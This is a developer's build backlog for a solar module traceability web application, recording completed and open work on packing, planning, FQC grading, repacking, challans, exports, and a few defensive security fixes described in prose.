# ICON TRACE — build backlog

Every item below is Mukesh's, captured verbatim in intent. Order within each
block is his; the blocks are ordered by what unblocks what.

Status: `[ ]` not started · `[~]` in progress · `[x]` done

---

## Branding & UI Polish  *(done — 24 Sep 2026)*

- [x] **Favicon:** Created `static/favicon.svg` — a radial-gradient orange sun
      disc with warm ring, matching the login-sun mark and EN-ICON logo artwork.
      Linked via `<link rel="icon" type="image/svg+xml">` in both
      `icon_trace.html` and `base.html` so every page shows the icon in the
      browser tab.
- [x] **Company name corrected:** "En Power Technologies Pvt. Ltd." →
      **"Icon Solar-En Power Technologies Pvt. Ltd."** in the login card note
      (`icon_trace.html` line 541) and the live-auth login note (`icon_live.js`
      line 203). Print templates (`gatepass_print.html`, `challan_print.html`,
      `pallet_sheet.html`, `ftr_print.html`) already carried the full name
      "ICON SOLAR-EN POWER TECHNOLOGIES PRIVATE LIMITED" and were untouched.
- [x] **Tagline updated:** Login subtitle and page `<title>` changed from
      "Traceability & Dispatch" → **"Solar Module Traceability System"**, which
      accurately describes what the application does across all its screens.

---

## Phase 4: Security and Remaining Issues (Sept 2026) *(done)*


- [x] **4a. Admin promotion:** Restricted admin promotion logic (rank 2 to 1 only).
- [x] **4b. Adaptive timing:** Added a dummy hash check and dynamic timing floor in `check_pw` to deter timing attacks.
- [x] **4c. XSS hardening:** Escaped all UI values (e.g. `display_name`) rendered via f-strings in `lab_app.py`.
- [x] **4d. Mask logs:** Unknown `login_id` in logs is now masked as `<unknown>` to prevent accidental password logging.
- [x] **4e. HMAC-SHA256:** Implemented HMAC-SHA256 using the TOTP Fernet key for token hashing.
- [x] **4f. Clock status caching:** Cached `sntp_drift()` results for 5 minutes in `icon_auth.py`.

---

## 0c. Terminology  *(corrected)*

- [x] **item** is the full description HO prints:
      `SOLAR PV MODULE-ISEN625-G12R-DCR`
- [x] **item_code** is our own short key beside it: `F02` + family + sequence,
      e.g. `F02010011`. Separate field, separate column.
- [x] `model_master = ISEN<wattage>-<type>`;
      `item_master = SOLAR PV MODULE-<model>-DCR/NDCR`
- [x] No product of another vendor is named anywhere in the code or on screen.
      `erp_code` is the nullable column their codes map into.

## 0b. Navigation  *(built)*

- [x] **The sidebar scrolls itself.** `#app` is a grid of viewport height and
      a grid item's `min-height` is `auto` — it refuses to be shorter than
      its content, so with the screens added since, the nav overflowed the
      row and its own `overflow-y:auto` never engaged. The wheel over the
      menu scrolled the page behind it. `min-height:0` lets the scroll it
      already asked for work.
      Collapsed it needed a second fix: that state set `overflow:visible`,
      which meant the rail could not scroll at all. `overflow-y:auto` there
      instead — the hover expansion never needed it, since the rail widens
      itself and `#app` does not clip.

- [x] Indent and Loading Verification are now **real v4 views** — a
      `<section class="view">` in `.main`, a nav button, and the id added to
      the roles that should see it, so `go()` reaches them like any other
      screen. One application, not two that look alike.
- [x] Placed by the work, not by the software: **Indent under PRODUCTION**
      (it is the instruction production runs against), **Loading Verification
      under DISPATCH** (that is where Team 3 stands). No "Records" section —
      that was a filing cabinet's idea of a factory.
- [x] Screens render as fragments using v4's own card / grid / fld / table
      classes, so they cannot drift into looking like a second app.
- [x] Every dashboard's Reset now clears its filter bar and re-runs the
      screen's own render function. It was decorative.
- [x] Sidebar collapses to a 46px icon rail; hovering slides the labels back
      out **over** the page rather than pushing it, so a scanning screen gets
      the width without the layout jumping every time the pointer passes.
- [x] **…and the button actually does it now.** v4's page carries its
      stylesheet INLINE and links nothing, so every rule the live layer adds
      sat in `static/icon.css` where that page never loaded it. The toggle
      set `side-collapsed` and no rule matched: nothing moved. The same was
      true of `.scroll`, the invoice drop zone and independent column
      scrolling — set, and silently inert.
      The additions are split into `static/icon_add.css`, injected into v4's
      page by the live layer and loaded after `icon.css` by the base shell.
      One copy, wherever it is needed; `icon.css` goes back to being v4's
      stylesheet verbatim.
      **Turning it on wakes several dormant features** — check Planning,
      FQC, Packing and Challan, whose two columns now scroll independently
      for the first time.
- [x] The choice is remembered for the session and shared by both shells.
- [x] The plain screens now use the same sidebar, so moving between them is
      not a jump into a different-looking application.

## 0a. Offline  *(built)*

- [x] Service worker caching the shell deliberately, keyed by build id, old
      caches deleted on activate.
- [x] IndexedDB outbox with client ids; replay is idempotent server-side.
- [x] Queue count visible in the top bar the whole time work is unsent.
- [x] Rejected items kept with the server's reason, never discarded.
- [x] Challan and Gate Pass refused offline — their numbers come from a
      transactional counter.
- [x] Chip shows the real state; **HTTPS still required on the plant LAN**.

## 0. Foundations — these unblock several screens

- [x] **Customer master, Lighthouse style.** `customer_code` per customer,
      canonical name, alias list so one company cannot appear under three
      spellings. Mapping applied wherever a customer is read from a document
      (invoice buyer/consignee, challan, indent).
      **Settled:** Lighthouse has codes but Unit-1 and Unit-2 spell customers
      differently and the export takes time, so `C0001…` stands for now and
      `lighthouse_code` is the column those map into later.
- [x] **`ICON STOCK` as an indent option.** Normal product, no customer named,
      assignable to anyone later. Appears in the indent selector alongside real
      indents.
- [x] **Box persistence.** Packing currently holds boxes in memory, so a
      refresh at 18 of 36 loses the pallet. Must live in SQLite from the first
      scan.
- [x] **Shared table behaviour** — filter, search, reset, scroll, export.
      Wanted on Management Overview, Production Dashboard, FQC Dashboard,
      Packing Log, Stock & Dispatch, Recent Allocations, Recent Production,
      Recent Grading, Select Boxes, Open Boxes. Build once, apply everywhere.
- [x] **Reset means reset.** Every filter bar's reset returns all fields to
      default and re-runs the query. Currently decorative.
- [x] **The row count counts.** `wireAll()` returned early for a table it had
      already wired, and every screen renders its rows *after* wiring — so
      the count was computed against an empty tbody and never recomputed.
      Indents showed no count at all and Recent Allocations sat on "3 rows"
      beside two. Wiring is once; the count and the filters are every time.

---

## 1. Management Overview

- [x] **Sample data gone.** v4 read a fixed `PROD` array; it is now served from
      `/api/prod`, counted from the serial master. `mgRows()` feeds the KPIs,
      the donut, the section table and the shift table, so replacing the array
      makes all of them live at once — v4 already did the arithmetic, it was
      only ever reading a fixed list.
- [x] Empty database shows "No data matches these filters", not last month's
      demo numbers.
- [x] Customer dropdowns come from the customer master, so one company cannot
      appear under three spellings in a filter.
- [x] **Export works, and it works everywhere at once.** Every Export button
      in v4 called `exportNote()`, which only toasted *"Export runs on the
      server in the real build — Excel with your current filters."* That
      sentence is now true. One delegated handler catches every one of them,
      reads the rows **off the screen** and posts them to `/api/export/xlsx`,
      which builds a real `.xlsx` with openpyxl.
      **Off the screen, deliberately:** a report that runs its own query is
      how a report and the screen it came from end up disagreeing about the
      same day. What was filtered out of view is absent from the file.
      Quantities land as numbers so they can be summed; `0001` and serials
      stay text, because a challan sequence read back as `1` is a different
      document. The Actions column of buttons is dropped.
- [x] Reset clears every filter field. *(checked 7 Oct: wireResets() clears every
      input/select in the bar and re-renders; each dashboard's own Reset returns to
      today's factory day - wireDateResets)*

**The pattern for every remaining screen:** find the array its render function
reads, serve that array from the database, call the render function again.
Never re-implement the screen — v4's arithmetic is the part that was agreed.

**The pattern for Export:** nothing. A card with a table exports itself, and
the page header's Export takes every table on the screen, one sheet each.
A new screen gets both for free.

## 2. Search & Trace

- [x] **Build Instances** and **Customer Assignment History** now sit below
      the Full Event Log. v4 put them between the crumb and the journey,
      which pushed the event log — the thing somebody searching a serial came
      for — below the fold. Both read as supporting detail, so both moved
      under it. `doSearch()` is patched to reorder after it renders; v4's own
      `serialView()` is untouched.
- [x] **The screen answers from the database.** v4's `serialView()` returned
      one fixed example — the same batch, the same FQC operator, the same
      repack, the same challan and vehicle, whatever serial was typed. Every
      value on it was an illustration, so the screen could not answer the
      question it exists for. `/api/trace/serial/<serial>` now returns the
      real record and the layout is drawn around it.
      **A stage that has not happened says so** — *not graded yet*, *not
      packed yet*, *not dispatched* — rather than borrowing the example's
      version, and a lookup that fails shows nothing rather than falling
      back to it. A plausible journey under a real serial is the one thing
      this screen must never produce.
      DCR eligibility is derived from grade, allocation and dispatch state,
      and reads `—` until the module has been graded.
- [x] **One page, two columns.** The event log, build instances and
      assignment history sit in `.work`'s left column with Materials Used as
      the rail beside them — `.work` is a `1fr 320px` grid whose rail spans
      50 rows, so cards left outside it dropped full width and left the
      space next to a long bill of materials empty.
- [x] **View full details** is back on the Materials Used card, opening v4's
      own modal. It reads the recorded makes rather than v4's
      `demoVendor()` and its invented `INV/26-27/…` batch references, and a
      material with no category is listed under *Other* rather than dropped.
- [x] **Materials Used** carries the makes actually chosen at allocation.
      The panel was already styled as the reference image, but its vendors
      came from v4's `demoVendor()` — a plausible make beside a real serial.
      It now reads `allocation_material`, and a make nobody recorded says
      **not recorded** instead of borrowing one.
- [x] **Opens empty**, and **an invoice number is a search**: Invoice ->
      challan(s) -> boxes -> serials, from the database. Round 10.
- [x] **Every number the system issues is a real search now** - serial,
      pallet / packing list (`ISPL260905/K001`), the new challan
      (`IS-05.09.2026/0001`, and `(MA)` as its own document), invoice
      (`ICON/26-27/822`), batch, vehicle, customer - all from the database,
      and v4's sample-data views are never called. Round 10 follow-up.
      **Not built:** a repacking-list *number* - the system has none; a repack
      retires the source pallets and mints new ISPL numbers, and the pallet
      view shows that trail both ways.
- [x] Box / Serial Journey — every title clickable, linking into Search. *(7 Oct:
      the module journey's batch, pallet and challan open in Search; the box,
      challan and invoice views already linked theirs)*
- [x] Reassignment history — only the original allocation is shown, because
      nothing else is recorded yet. Needs a customer-assignment table before
      the panel can say more. *(checked 7 Oct: built - Customer assignment
      history adds a row per `box.customer_assigned` audit, DECISIONS 3)*

## 3. Production Dashboard

- [x] **Live data binding and filters.** Filters are fully functional via new API endpoint `/api/prod/dashboard`.
- [x] **OEE disabled.** Line performance table ignores missing Line data and removes OEE/efficiency metrics until further notice.
- [x] **Export works, and Reset exists at all.** The filter bar had Apply and
      nothing to undo it with, so a Reset is injected beside it and
      `wireResets()` picks it up by its label like every other one.
- [x] **Export on Line & Shift Performance.** That card had no Export button
      to begin with — one is injected into its header and goes through the
      same handler as the rest.

## 3b. Packing Log

- [x] **Live data binding.** Filters are fully functional via new API endpoint `/api/packing/log`.
- [x] **Operator-defined pallet capacity.** The Packing Log shows `qty / capacity` exactly as recorded by the operator in the database (`box` table), rather than capping or assuming from the indent.

## 4. Indent  *(done, keep in step with later changes)*

- [x] **An edit can no longer empty an indent.** A PUT carrying no items
      deleted every line, and because the progress view joined to those
      lines the indent then vanished from every screen while its number went
      on refusing to be used again — invisible and un-recreatable. The usual
      cause was saving before the form had finished loading. Refused now,
      and the view LEFT JOINs so an already-empty one is visible and can be
      given items back. `SEP-09/2026` in the current database is one of these.
- [x] **The list says which item it is showing.** One row per item is by
      design; two rows under one number is an indent with two items, which
      read as a duplicate. The repeated number is greyed and the item number
      shown.
- [x] **Save once per press.** Two quick clicks sent two creates, the second
      answered "already exists" about the first — an error about your own
      work a second earlier.
- [x] **The Indent screen hears about allocations.** Edit vs Header is
      decided by whether anything has been allocated, and nothing refreshed
      that after Planning ran: the button went on offering an edit it would
      then refuse, until the page was reloaded.

- [x] **Export.** One row per indent item - indent, customer, item, cell
      type, ordered, dispatched, remaining - through the same `/api/export/xlsx`
      every other screen uses. Round 10.
- [x] Items not lines; one item with **+ Add item**.
- [x] Customer type-to-suggest.
- [x] Lot name, optional.
- [x] Item picked from the item master; wattage, cell type and KW follow.
- [x] `item_master = model_master × DCR/NDCR` (Lighthouse style)
      `model_master = ISEN<wattage>-<type>`

## 5. Planning & Allocation

- [x] **Serials resolve again.** v4's `derive()` matches `x.watt === p.watt`
      and `x.tc === p.tc`, both strings out of the barcode. The boot payload
      sent wattage as an integer and no type character, so every serial fell
      through to "not produced at Unit-2".
- [x] **Serial checked against the indent item** — wattage, type character and
      format version. A 625 W range against a 620 W item is refused with the
      reason, not discovered at dispatch.
- [x] **v1 serials cannot be allocated.** They still ship from stock; nothing
      new is produced under v1.
- [x] **Quantity gate.** Allocation is capped at what is LEFT on the item —
      ordered minus already allocated, not minus dispatched. A serial that
      exists but has not shipped is already spoken for.
- [x] **Partial allocation is normal** and says so: the balance stays
      available and can be allocated later as a separate batch.
- [x] **Withdraw an allocation** while every serial is still `planned`. Once
      one has been graded, production has acted on it — raise a hold instead.
      `allocation_material` is deleted with it; leaving those rows behind
      made every withdraw of a batch with materials fail on a foreign key.
- [x] **Batch numbers read `BAT-2609-00007`** — the year and month of the
      allocation, then its sequence, which is the shape v4 and the floor
      already use. Rendered from the allocation's date and id, never stored:
      a batch number in a column of its own is a second copy of both, free
      to drift away from the row it names.
- [x] "Indent line" is called **Indent item** throughout.
- [x] Ordered / Already allocated / Left to allocate shown on the item block.
- [x] End serial derived from the start and greyed out.
- [x] **Load into master only enables once every material make is chosen** —
      a batch whose materials are unknown cannot be traced afterwards.
- [x] Duplicate customer field removed; production schedule, job card and
      internal/sales order removed.
- [x] Recent Allocations: real rows, search, indent and state filters, its
      own scroll.
- [x] The two columns scroll independently, and a column that reaches its end
      does not pass the gesture to the page.
- [x] Indent selector previews **customer, wattage, ordered and left** in the
      option text, and the item selector shows ordered and left per item.
      v4 rebuilds both dropdowns inside `indentChange()`, so a one-off text
      pass was undone the moment an indent was picked — the builder is patched
      instead.
- [x] Serials **viewable, printable and exportable in the old barcode-sheet
      layout**: merged heading, `S.NO. | BARCODE` pairs, 1000 rows per pair
      then a new pair to the right. The layout is reproduced; the serials come
      from the database rather than being re-generated.
- [x] **End serial unlocked again.** Locking it forced the whole balance into
      one batch, which contradicts partial allocation. It is suggested while
      empty, never overwritten once typed, and anything longer than what is
      left is refused by the quantity gate.
- [x] **Load into master writes to the database** and reports the refusal
      reason on the rail instead of failing silently.
- [x] Planning opens on **Recent Allocations with New plan on top**, the same
      shape as Indent — arriving in an empty form gives no sense of what is
      already in flight.
- [x] Recent Allocations scrolls inside its own card, so forty batches do not
      push the page down.
- [x] **Scroll works from anywhere.** `overscroll-behavior: contain` froze the
      page whenever the pointer sat over a column with nothing left to scroll,
      leaving the gap between columns as the only place a wheel worked.

## 6. Production Entry

- [ ] **Segments, not a change point.** A production entry is a list of
      segments, each with its own serial span and materials. Boundaries are
      serial numbers, so the "changed at serial" field disappears and any
      number of changes is expressible.
      Rules: segments contiguous, covering the whole range, no gaps or
      overlaps; a segment must differ from the one before it.
- [ ] Ticking "material changed part-way" with nothing filled blocks the save.
- [ ] Multiple changes per range (currently one).
- [ ] Remove second verification.
- [x] **Filter styling.** Update the Recent Production Entries filter bar to match the layout of the dashboards (e.g. Production Dashboard), using stacked `.fld` elements with labels (From, To, Shift, Customer, Model) in a `.grid`, instead of the current compact inline format.
- [x] Recent Production Entries: real date-range/shift/customer filters,
      a Reset, a search box and a scrolling card - see Round 9 below. The
      Export button itself still just toasts (`exportNote()`); a real
      **Traceability Report** export format is still open.
- [x] Export format is the **Traceability Report**. *(checked 7 Oct: built in
      Round 38 - /export/traceability.xlsx, IS-MP2-PDN-FM-02)*

## 7. Loss of Production  *(landing + real persistence, built)*

**What was wrong.** v4's own screen (`v-loss`) was a fully-worked mockup -
"Open events" / "Closed events this shift" / "In-process scrap" tables,
a rich "Open a downtime event" form (line, machine, coded reason,
planned/unplanned, primary-or-induced with a linked-event dropdown,
start time, entry mode), and a genuinely correct machine-capacity-share
calculation in `renderLoss()` (`MACHINES`, `machCount()`) that turns
closed primary events into modules lost, excluding induced time from
the total so a cascaded stop is never counted twice. All of it ran
against the sample `EVENTS` array, permanently - nothing persisted.

**What changed.** Same shape as every other screen this project has
brought over from v4: the calculation logic (`renderLoss`, `evMins`,
`machListFor`, `MACHINES`/`machCount`) is kept **completely unchanged** -
not reimplemented server-side, since it is already correct and doing
that a second time in Python is exactly how the two versions drift.
Only the data source changed, from the sample array to real rows, on
top of a landing/form split matching Production Entry's own pattern.

- [x] `loss_event` table - opened, then closed; `minutes` is always
      derived from the two real timestamps at close time, never typed.
      An induced stop's `linked_event_id` is a real foreign key, checked
      server-side against a currently-open primary event - not a string
      match on a display label the way v4's own demo linked them.
- [x] `POST /api/loss_event` (open), `POST /api/loss_event/<id>/close`,
      `GET /api/loss_events` (list, with `date`/`shift`/`q` filters,
      server-side).
- [x] `openEvent()`/`closeEvent()`/`evMachines()` replaced outright (not
      patched - their whole job changes from a local array mutation to a
      real write). `evMachines()` specifically: the "Caused by" dropdown
      now carries each open primary's real `event_id` as its option
      value, not v4's own display-string id, which the server has no way
      to resolve back to a row.
- [x] A "Record downtime event" button (`.pg-act`, matching Production
      Entry's own) toggles between the landing (Open/Closed/Scrap
      tables) and the rail form. The landing's own date-range/shift
      filter bar and Reset were added in Round 9, below - v4's Date/
      Shift fields at the top stay shift SETUP only now (read by
      `calcLoss()`/`openEvent()`), not filters.
- [x] **Filter styling.** The event list filter bar has been updated to use the stacked `.fld` / `.grid` layout, and the top shift setup row has been styled into a neat `.card-b` summary trail, precisely mirroring Production Entry's standard layouts.
- [x] **Dynamic filters.** The Shift dropdown in both Loss of Production and Production Entry now dynamically populates its options based directly on the fetched data showing in the UI, matching the Customer dropdown logic.
- [x] The "Closed events this shift" card is this screen's own recent-
      items list. No search/filter wiring was added to it directly -
      `'loss'` is already in `TABLE_SCREENS`, so `wireScreenTables()` (run
      once at sign-in) had already claimed every table-holding card in
      this view before this round touched it. Confirmed live, not
      assumed - an initial attempt to add a second, explicit
      `data-itable` assignment here was dead code that never ran.
      `SCRAP` and "Submit shift" are untouched, out of scope.

**Two real bugs found live, not by reading the code.**
1. The "Record downtime event" button's own toggle logic was copied from
   Production Entry's, which checks whether `.wmain.o1` is hidden to
   decide whether to reveal its form. In Loss of Production the layout
   is the other way round - `.wmain.o1` is the *landing*, `.rail.o2` is
   the *form* - so the copied check answered the opposite question and
   the button did nothing on the first click. Fixed to check `.rail.o2`
   directly.
2. The screen's Date filter field ships in v4's own markup pre-filled
   with a fixed demo date (`2026-08-21`). Left as-is, every fetch
   (including immediately after opening a brand-new event) silently
   filtered every real, current event out by date - "Nothing is down
   right now" even seconds after opening one. Reset to today's date the
   first time the field is given its real id, the same fix Loading
   Verification needed for the same reason earlier this week.

**Which tests prove it.** `test_loss.py` (new, 9 cases: open/close, the
induced-link rule checked both ways - refused with no link, refused
against a closed or nonexistent primary, accepted against a real open
one - date/shift/text filtering, and required-field validation). Every
rule mutation-tested. Verified live against a running server with
Playwright (15 checks): the button toggle, the form appearing and
returning to the landing list, a real primary event opening and showing
up in the real "Open events" table, an induced event correctly linked by
real `event_id`, the same induced event refused client-side with no
link selected (confirmed the request was never even sent, not just that
a toast appeared), closing an event and getting back real derived
minutes, and the recent-items search box. Full suite still green: 91
Python + 71 JS.

## 8. FQC Dashboard

- [x] Export — the filter bar's Export takes the whole screen (KPI strip,
      shift table, every card), and each card's own Export takes that table.
- [x] **Search, reset, scroll and count on every table.** icon_table.js did
      all of it already; the dashboards were simply never marked up for it,
      so "build once, apply everywhere" had stopped at Recent Allocations.
      Every card holding a table is now claimed by the shared layer — its
      own scroll box, its own search, Reset and row count — across all
      fifteen screens, so one added later gets it by existing.
- [x] **The filter bar reaches the server, and one filtered answer is what
      every number on the page shows.** From/To, Shift, Customer, Model and
      Result reached nothing: Apply filtered a fixed sample array
      (`SHIFT_ROWS`) and wrote what it found into the Shift table's Total
      row — the same row a second, separate path (real data, but always
      unfiltered) never touched. Whichever ran last decided what was on
      screen, and neither was ever both real and filtered — a screenshot
      showed the Total row still reading v4's demo "2,847 / 2,791 / 56"
      under real, filtered-looking cards above it.
      `/api/fqc/dashboard` now takes `from`/`to`/`shift`/`customer`/`model`/
      `result`, and one client function paints the KPI cards, the shift
      table **and its Total row**, category composition (real GY/BGY
      counts, not one lumped bucket), rejection reasons (real defects,
      grouped — the old version showed one row reading "Recorded FQC
      decisions" no matter what was actually wrong with anything), the
      day-wise table and the donut from that one filtered answer. Customer
      is picked by name and sent as its code; Model is populated from the
      real model master rather than v4's fixed five.
      Tests: `test_fqc.py` (10 new, server-side filtering and the defect
      breakdown) and `test_fqc_dashboard.js` (18, what the screen paints
      from one filtered answer, and that Apply/Reset/changing a date all
      ask the real question).

## 9. FQC Entry

- [x] Recent & Grading: search, filter, result, scroll, export. *(checked 7 Oct:
      Shift/Customer/Wattage/Result/Defect filters - dynamic since 3595fda - plus
      the shared search/scroll/export)*
- [x] **One defect list, the 44, searchable.** A rejection is filed under a
      name from Mukesh's list, found by typing any part of it (`jb` finds
      every name with JB in it, not only those that start with it). It
      replaces the old twelve-entry list everywhere - see Round 10.
- [x] **Recent gradings** shows Customer (after Model) and keeps Proposed;
      it has no Disposition and no Bld column (Bld stays on the record - FQC
      needs it - it is just not listed here). Round 10 and its follow-up.
- [x] **"Other" is on the defect list, and its note is compulsory** - in the
      form and on the server, like a coded reason of OV-OTHER. Follow-up.
- [x] **The proposal can be overridden, both ways, and a panel never just
      lacks the option.** Proposed pass -> reject (defect from the list, coded
      reason, Other -> note); proposed reject -> pass when the EL is the only
      objection, or when the tester is unreachable (provisional, held). A
      reading below the wattage still cannot be overruled - the button is
      there, disabled, and says why. A defect and a note can be added to a
      pass. Round 10, second follow-up.
- [x] **A decision made without the tester is held, then reconciled.**
      Provisional pass -> state `hold`, listed in Hold & Deviation, not
      packable; reading arrives and agrees -> confirmed and released by
      itself; disagrees -> Needs Review for Quality. Round 10, second
      follow-up. (Hold & Deviation is otherwise still v4's demo of material /
      box / batch holds - hidden, not built.)

## 10. Packing Log

- [x] **Above New Pallet in the sidebar, and the screen Packing opens on.**
      Both are set before v4's `signIn()`, which ends in
      `go(ROLES[role].home)` — changing the home afterwards would be a
      screen too late. Arriving straight into an empty pallet form gave no
      sense of what was already packed, the same reason Planning opens on
      Recent Allocations.
- [x] Export — page header and per-card, same as the other dashboards.
- [x] Reset, search, scroll and count on every table — from the shared layer.
- [x] Print boxes. *(checked 7 Oct: every Packing Log row has Print -> the
      packing list by box id; prints are logged since 8ac1054)*

## 11. New Pallet

- [x] **Packing is real.** The screen decided whether a module had passed
      FQC from the LAST DIGIT of its serial, held the pallet in a JavaScript
      array and saved nothing. Every scan goes through the server gate now —
      graded, matching grade and model, not already in a box, within
      capacity — and the box is a row from its first scan, so a refresh at
      18 of 36 finds it again.
      The screen previews with the **same function** the scan enforces with,
      so what the operator is shown before pressing Add is what decides.
      A refusal names the box a module is already in, by its printed number.
- [x] **A packed module is recorded as packed.** The scan added the row and
      left the serial reading `graded`, so only the box knew. Both writes
      happen together, as DATA_LAYER always said they did; pulling a slot
      puts the state back.
- [x] **What a box IS cannot be typed into it.** New Pallet offered a
      Customer dropdown of four demo names and three grade buttons, none of
      them connected to the modules being scanned — so a pallet could be
      labelled SAI BABUJI, grade A, and filled with ICON STOCK GY modules.
      The screen said one thing and the box said another, and the label is
      what the transporter reads.
      Customer, model and grade come from the first module scanned and are
      fixed for the life of the box; the gate refuses anything that does not
      match. Capacity and bin stay the operator's, and capacity locks once
      the box is a row, because that is what it was opened with. The packing
      date shows the date the box was actually opened rather than a date
      typed into v4 two years ago.
      **Bug found and fixed:** the box was still being opened with whichever
      grade button was lit on screen, not the grade the check had just read
      off the module — the segment could disagree with the module and win.
      `packEnsureBox` now opens the box with the module's own server-verified
      grade; the pre-box preview no longer sends a guessed grade at all, so
      there is nothing for a click to override. The segment is disabled at
      every point in a box's life and only ever displays what the box already
      is, never a choice.
      **Second bug found and fixed:** a capacity refusal from `/api/box/open`
      (over the ceiling) was being read as a successful open — `packBox` got
      set from a body with no `box_id`, and every later scan believed a box
      existed that the server had refused to create. The response is now
      checked before anything is assigned, and a refusal leaves the screen
      able to open a real box on the very next scan.
- [x] **The box reports its real number.** `render()` wants a date and the
      column holds text, so every box was quietly reporting its bare
      sequence instead of `ISPL260909/K001`.

- [x] **Simulate a full box is gone.** It filled the open pallet with
      invented serials (`ICON590G1202121001` upwards) a slot at a time.
      Beside a real scanner on a real pallet that is one wrong click from a
      fabricated box in the record — the same reason the invoice screen's
      simulate buttons went. The button is removed and `fillDemo()` is
      neutralised, so nothing can reach it by another route.
- [x] Survive a refresh mid-pallet. The box is a row from the first scan;
      `packRestore()` reads `/api/boxes?state=open` on load and rebuilds the
      slots from `/api/box/<id>`, once per screen load.
- [x] Tests: `test_packing.py` (17, server gate) and the new `test_packing.js`
      (16, the screen's own wiring) — first-module authority, a refused
      open leaving nothing corrupted, an ungraded/duplicate/mismatched
      module never reaching the server at all, the segment staying inert,
      and a part-packed pallet surviving a reload.
- [x] Label layout per the reference images (Lighthouse pallet sheet): header
      block, Voucher No / Voucher Date, Model Type, Pallet No, Pallet Grade,
      Order No, QR, then a **two-column UID barcode table**.
      **Open:** that sheet numbers pallets `PA26813-0107`. We settled on
      `ISPL260901/T001` with the indirect grade letter. Reading this as
      *use the layout*, not the numbering — confirm.

## 12. Repack  *(built)*

- [x] One scroll on Open Boxes, listing every **closed** pallet from the
      database, with its customer, model, grade and quantity. v4 listed five
      pallets from a fixed array and generated their contents by counting up
      from a base serial.
- [x] Saves. v4's Complete button raised a toast and wrote nothing.
      `POST /api/repack` retires the source pallets, mints new numbers for
      the children and writes `box_lineage`, so the trail from a dispatched
      module back through every pallet it sat in stays whole.
- [x] **Every module is accounted for.** What is placed goes into a new box,
      what is left is released back to graded stock, and what nobody mentions
      stays together as the remainder of its own pallet. Repacking twenty of
      thirty-six and saying nothing about the other sixteen is how sixteen
      modules stop existing.
- [x] The retired pallet **keeps its contents**, so "what did K001 hold?" is
      still answerable after the pallet is gone. `serial_in_live_box()`
      ignores retired boxes, so a module sitting in both blocks nothing.
- [x] A pallet named on a **challan cannot be opened** — the document the
      transporter carries would stop being true. Those rows show as locked
      in the list rather than being refused after half a pallet is scanned.
- [x] A new box claims one grade and one model, set by the first module put
      in it. Quality may have moved a grade since packing — usually that is
      *why* the pallet is open — so the master record decides, not the label
      the modules came in under.
- [x] Any pallet size, typed. v4 offered 36 / 27 / 26 / 18 from a menu.
- [x] A reason is required, and *Other* on its own is not one.
- [x] Modules are placed in the browser and nothing is written until Complete.
      New pallet numbers are only issued at that point, so an abandoned
      session burns no numbers.
- [x] After saving, each new pallet is listed with its number and a **Print
      pallet sheet** button. Opening a tab per pallet gets all but the first
      blocked by the browser, and a blocked print is one nobody knows is
      missing.

- [x] **Topping up a short pallet from fresh graded stock.** A repack was
      only ever a split: whatever a group named had to already be in one of
      the source pallets, and anything else was refused as "not in this
      box." Mukesh: a pallet opened because two modules were pulled for a
      dispatch should be toppable back up to a full pallet, not condemned to
      stay short — an operator can scan genuinely fresh stock into a group,
      not only what came out of a source.
      A serial not from any source pallet is now a candidate rather than an
      automatic refusal: it goes through exactly what a normal scan checks
      — graded, matching the group's grade and model, not already claimed by
      some other live pallet — via `_pack_refusal`, the same function the
      packing screen's own scan uses, rather than a second copy that could
      drift from it. The Repack screen's scan box does the same: an
      unrecognised serial is checked against `/api/box/check` and, if it
      clears, tops up the active box with a `fresh` tag; taken back out, it
      is discarded rather than manufactured into a "loose from a pallet" row
      that was never true.
      The result reports `moved`, `released` and `added` separately, and
      each child box lists which of its modules were added fresh.
- [x] **A pallet must be filled to exactly its own declared capacity, or the
      save is refused.** "Partial" quietly let a box close short of what it
      was opened for — the fix for a pallet that will not reach its number
      is not to let it through anyway, it is to scan the rest in, take
      modules out, or change what the box is declared to hold. `/close`
      (New Pallet and Repack alike) now refuses unless filled qty equals
      capacity exactly, naming the shortfall; a new `/api/box/<id>/capacity`
      lets an open box's declared size be changed, never below what is
      already in it nor past the frame's ceiling. On the Repack screen, a
      target box's own capacity stays editable after it is created, for the
      same reason. `is_partial` stays in the schema for historical rows;
      nothing sets it true any more.
- [x] Tests: `test_repack.py` (29, was 21) and `test_repack.js` (27, was 19);
      `test_packing.py` (33, was 27) and `test_packing.js` (26, was 22) for
      the capacity-must-match rule on the New Pallet side.

## 13. Stock & Dispatch

- [x] Export — page header and per-card, same as the other dashboards.
- [x] Filters, reset, scroll and count — from the shared layer.

## 13a. Flash Test Report  *(new, built)*

- [x] Generated from the Sun Simulator export rather than assembled by hand.
- [x] Latest **valid** row wins — retesting after a failed probe is routine.
- [x] A serial with no valid reading is listed as missing **with the reason**,
      never dropped and never filled with a plausible number.

## 14. Invoice

- [x] Real PDF parser — label-based, three field classes, contact person,
      GSTIN fix, QR best-effort, e-Way Bill validity.
- [x] Wire v4's invoice screen to it in place of the simulated parse. *(checked 7
      Oct: it posts the PDF to /api/invoice/parse; the simulate buttons are gone)*

## 15. Challan  *(built)*

**What was wrong.** v4's Create Challan screen ticked boxes from a fixed
`CH_BOXES` array, invented refusals from a `SERIAL_FAULTS` map keyed to a
handful of planted serials, had no way to pick an invoice at all, and its
Create button only raised a toast — nothing was ever written. `runChecks()`'s
KW arithmetic (`sum(qty × wattage) / 1000`, per box, so mixed models sum
correctly) was already right and is kept unchanged.

**What changed — server (`app.py`, `db.py`).**
- [x] `GET /api/challan/boxes` — closed pallets not already on a live
      (non-cancelled) challan, including a draft's reservation.
- [x] `_challan_precheck()` — the one gate the rail previews and Create
      enforces, never a softer version of the other. Decides, per ticked
      box: closed and graded; not already on another challan; belongs to
      the invoice's buyer, or is General Stock. Decides, per invoice: not
      superseded (names the newer one); e-Way Bill not expired; declared
      quantity equal to **the sum of the boxes ticked** — never read from,
      or bent to fit, the invoice, and there is no override parameter
      anywhere in the request this function reads.
- [x] `POST /api/challan/checks` — the same function, as a live preview.
- [x] `POST /api/challan` (`action: draft|create`) — draws the real
      financial-year sequence and writes `challan_box` / `challan_serial`
      immediately on a draft, which **is** the reservation: nothing else
      can select those boxes while it exists and is not cancelled. A draft
      does not move a single serial to `dispatched`; Create does, at once.
      Boxes are written in **ticked order** (`load_order`), never resorted.
- [x] `POST /api/challan/<id>/submit` — turns an existing draft into the
      real thing. Re-validates everything against current state (an
      e-Way Bill can lapse while a draft sits open) but **never redraws the
      sequence** — a challan drafted at 23:50 keeps its number even if
      confirmed after midnight, when the FY counter belongs to a new day.
